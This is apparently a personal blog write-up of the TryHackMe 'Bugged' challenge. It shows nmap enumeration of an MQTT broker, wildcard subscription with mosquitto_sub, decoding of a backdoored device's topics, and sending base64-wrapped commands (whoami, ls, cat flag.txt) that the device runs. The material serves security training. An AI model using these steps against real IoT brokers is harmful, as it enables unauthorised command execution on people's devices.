---
title: Bugged
date: 2025-10-04 12:04:00 +0200
categories: [TryHackMe, Challenges]
tags: [iot, mqtt]
description: John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?
image: /assets/img/THM/Bugged.jpg
---

>**Platform:** [TryHackMe](https://tryhackme.com/room/bugged) - 4 Oct 2025

>**Rating:** Easy

## Abstract
This writeup covers the TryHackMe "Bugged" challenge, which focuses on analyzing MQTT communications in a simulated smart home environment. By enumerating open ports and decoding MQTT traffic, we uncover a backdoored IoT device and demonstrate how to interact with it to retrieve the flag.

## Enumeration
I start off by scanning the IP, achecking for open ports.
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.142.79
PORT     STATE SERVICE
22/tcp   open  ssh
...
1883/tcp open  mosquitto version 2.0.14 syn-ack
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/broker/bytes/sent: 1073
|     $SYS/broker/publish/bytes/received: 9286
...
|     storage/thermostat: {"id":3558129027290157839,"temperature":23.430103}
...
```
{: .nolineno}
The scan reveals an open port (1883) used for the MQTT protocol. It even shows some of the IoT devices connected to the *'Broker'* and the available *topics* which they post to, along with the most recent payload for those topics.

Since the service running is **mosquitto**, as revealed by the scan, I will install and use that for interacting with the traffic.

The following command lets us *subscribe* to traffic relayed by the broker.
```sh
┌──(kali㉿kali)-[~]
└─$ mosquitto_sub -h 10.10.142.79 -t "#" -v
patio/lights {"id":17067615417940530788,"color":"ORANGE","status":"ON"}
frontdeck/camera {"id":3081743840256966965,"yaxis":-159.03606,"xaxis":11.9752655,"zoom":4.020044,"movement":true}
storage/thermostat {"id":10517548528827059288,"temperature":23.487356}
GqMpRSEobh/TvLQehMg0E/... ...VHZMUWVoTWcwRS9zdWIifQ==
```
{: .nolineno}
>*-t* specifies the topic we wish to subscribe to, where '#' serves as a wildcard, so we receive everything.
{: .prompt-info }

We see that some base64 encoded data is being transmitted. Decoding the data reveals a device ID and some information as to how it might operate. It also reveals the topics it subscribes and publishes to.
```sh
┌──(kali㉿kali)-[~]
└─$ echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ== > tmp.txt

┌──(kali㉿kali)-[~]
└─$ base64 -d -i tmp.txt
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```
{: .nolineno}
## Exploit
First I'll try to publish a message to the topic it subscribes to. Meanwhile I'll be subscribing to the topic it publishes to.
```sh
┌──(kali㉿kali)-[~]
└─$ mosquitto_pub -h 10.10.142.79 -m "whoami" -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub
```
{: .nolineno}
```sh
┌──(kali㉿kali)-[~]
└─$ mosquitto_sub -h 10.10.142.79 -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=

*base64 decoded becomes:*
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```
{: .nolineno}
Using this toghether with the previous information, we now know that we can communicate with this backdoored device, and how to do so.
>Below I will skip the encoding/decoding and communication process, as it follows the steps already shown. Thus only showing the sent and received payloads. Alternatively use an online tool like CyberChef[^1] for encoding/decoding.
{: .prompt-info }
```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd": "CMD", "arg": "whoami"}
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"challenge\n"}

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd": "CMD", "arg": "ls"}
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd": "CMD", "arg": "cat flag.txt"}
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{※\(^o^)/※}\n"}
```
{: .nolineno}
## References
[^1]: [CyberChef](https://gchq.github.io/CyberChef/)